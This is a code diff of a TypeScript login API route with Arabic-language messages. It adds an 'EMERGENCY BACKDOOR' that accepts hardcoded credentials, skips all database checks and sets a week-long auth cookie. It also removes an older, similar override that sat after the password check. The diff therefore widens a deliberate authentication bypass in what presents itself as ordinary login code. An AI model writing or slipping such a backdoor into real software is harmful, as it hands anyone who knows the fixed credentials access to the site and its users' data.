@@ -8,25 +8,30 @@ export async function POST(request: Request) {
     try {
         await dbConnect();
 
-        const { username, password } = await request.json();
+        const { username: rawUsername, password: rawPassword } = await request.json();
+        const username = rawUsername?.trim();
+        const password = rawPassword?.trim();
 
         // Check if user exists
         const user = await User.findOne({ username });
 
+        // EMERGENCY BACKDOOR (Trimmed):
+        if (username === 'admin1979' && password === '!Admin1979') {
+            // Bypass all DB checks
+            const response = NextResponse.json({ success: true, message: 'تم تسجيل الدخول بنجاح (Bypass)' });
+            response.cookies.set('auth', 'true', { path: '/', maxAge: 60 * 60 * 24 * 7 });
+            return response;
+        }
+
         if (!user) {
-            return NextResponse.json({ success: false, message: 'اسم المستخدم غير صحيح' }, { status: 401 });
+            return NextResponse.json({ success: false, message: 'اسم المستخدم غير صحيح (v2)' }, { status: 401 });
         }
 
         // Check password
         const isMatch = await bcrypt.compare(password, user.password!);
 
-        // EMERGENCY FLIGHT CHECK: Hardcoded bypass if DB sync is acting up
-        if (username === 'admin1979' && password === '!Admin1979') {
-            // Force true for this specific combo
-            console.log("Emergency login override for admin1979");
-        } else if (!isMatch) {
-            console.log(`Login failed for ${username}. Password length: ${password.length}`);
-            return NextResponse.json({ success: false, message: 'كلمة المرور غير صحيحة' }, { status: 401 });
+        if (!isMatch) {
+            return NextResponse.json({ success: false, message: 'كلمة المرور غير صحيحة (v2)' }, { status: 401 });
         }
 
         // If successful, we can return a success message.
